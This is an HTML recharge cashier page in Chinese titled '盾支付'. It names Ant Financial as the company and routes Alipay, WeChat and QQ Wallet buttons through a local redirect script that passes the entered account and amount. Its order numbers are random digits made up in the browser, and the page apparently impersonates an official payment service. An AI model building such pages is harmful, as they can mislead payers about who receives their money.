<!DOCTYPE html>
<html lang="zh"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <title>网银在线安全快捷支付支付系统|收银台</title>
    
    <link href="./css/common.css" rel="stylesheet">
    <link href="./css/index.css" rel="stylesheet">
    <style type="text/css">
    body,td,th {
	font-family: \5FAE\8F6F\96C5\9ED1, Helvetica, STHeiTi, sans-serif;
}
body {
	background-color: #F0F0F0;
}
    </style>
</head>
<body>
<div class="head clearfix">
    <div class="main">
        <div class="logo-area">
            <h1>盾支付</h1>

            <h2>收银台</h2>
        </div>
    </div>
</div>
<div class="main clearfix">
    <div class="progress">
        <ul class="cur clearfix">
            <li>1、提交订单</li>
            <li>2、选择支付方式</li>
            <li>3、购买成功</li>
        </ul>
    </div>
    <div class="pay-content">
      <p>
            <strong>请您及时付款,以便订单尽快处理！</strong>请您在提交订单后<span>5分钟</span>内完成支付，否则订单会自动取消。
      </p>
      <p>&nbsp;</p>
      <p>&nbsp;</p>
      <p class="order-id">会员账号：
        <input  name="account" type="text" id="zh" onfocus="this.value='';" value="" style="width:180px; height:22px;"  >
&nbsp;&nbsp;温馨提示：请输入网站会员账号!</p>
      <p class="order-id">充值金额：
        <input  name="money" type="text" id="ye" onfocus="this.value='';"  value="5.00" style="width:80px; height:22px;"  onkeyup="if(isNaN(value))execCommand('undo')" onafterpaste="if(isNaN(value))execCommand('undo')">
      元 &nbsp;&nbsp;温馨提示：请按照提示金额付款,否则不充值!</p>
      <p class="order-id">&nbsp;</p>
      <ul class="payInfor">
        <li><strong>公司名称</strong><em>：</em>蚂蚁金服网络科技股份有限公司</li>
            <li>订单编号：
<script type="text/javascript">

var charactors="0123456789";
var value='',i;
for(j=1;j<=20;j++){
	i = parseInt(10*Math.random()); 　
	value = value + charactors.charAt(i);
}
document.write(value);

var charactors="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
var OrderId='',i;
for(j=1;j<=30;j++){
	i = parseInt(67*Math.random()); 　
	OrderId = OrderId + charactors.charAt(i);
}

var myVar = setInterval(function(){ myTimer() }, 100);
function myTimer() {
    var d = new Date(); 
    var t = d.toLocaleTimeString();
	document.getElementById("Alipay").href='./standard/?goto=https://excashier.alipay.com&payOrderId='+OrderId+'&money='+document.getElementById("ye").value+'&type=1&Order='+value+'&account='+document.getElementById("zh").value;
	document.getElementById("WeChat").href='./standard/?goto=https://excashier.alipay.com&payOrderId='+OrderId+'&money='+document.getElementById("ye").value+'&type=2&Order='+value+'&account='+document.getElementById("zh").value;
	document.getElementById("QQ Purse").href='./standard/?goto=https://excashier.alipay.com&payOrderId='+OrderId+'&money='+document.getElementById("ye").value+'&type=3&Order='+value+'&account='+document.getElementById("zh").value;
	
	
}
</script>
</li>
      </ul>
        <dl class="pay-list">
            <dt>支付方式</dt>
            <dd>
                    <a id="Alipay" href="" target="_blank"> 
					<span><img src="./css/ali_direct_pay_pc.png" alt=""></span>
                    </a>
                
                    <a id="WeChat" href="" target="_blank"> 
					<span><img src="./css/wx_pay_pub_scan.png" alt=""></span>
                    </a>
     
                    <a id="QQ Purse" href="" target="_blank"> 
					<span><img src="./css/qq_direct_pay_pc.png" alt=""></span>
                    </a>
            </dd>
        </dl>
  </div>
</div>

<div class="footer clearfix">Copyright © 2004-
<script type="text/javascript">
var myDate = new Date(); 
document.write(myDate.getFullYear());
</script> 
版权所有 翻版必究</div>
<div class="mask-layer "></div>

<div class="pop-layer" id="confirmPay">
    <div class="pop-tit"><h5>确认支付</h5><button class="cls-btn">关闭</button></div>
    <div class="pop-cont">
        <p><strong>请在新打开的支付页面完成支付</strong>支付完成前请勿关闭本窗口</p>
        <div class="pop-btns">
		            <button class="pay-success-btn"><strong>已完成支付</strong></button>
			
            <button class="pay-erros-btn cls-btn"><strong>更换支付方式</strong></button>
        </div>
        <p class="pro">支付遇到问题？请联系&nbsp;<span class="hotline">网站客服</span>&nbsp;获得帮助</p>
    </div>
</div>

<form id="payComplete" style="display: none" method="" action="../">
    <input name="" type="hidden" value="">
</form>

<script>
    var goSuccessUrl = '';
    var goFailUrl = '';    
</script>

<script src="./css/index.js"></script>

</body></html>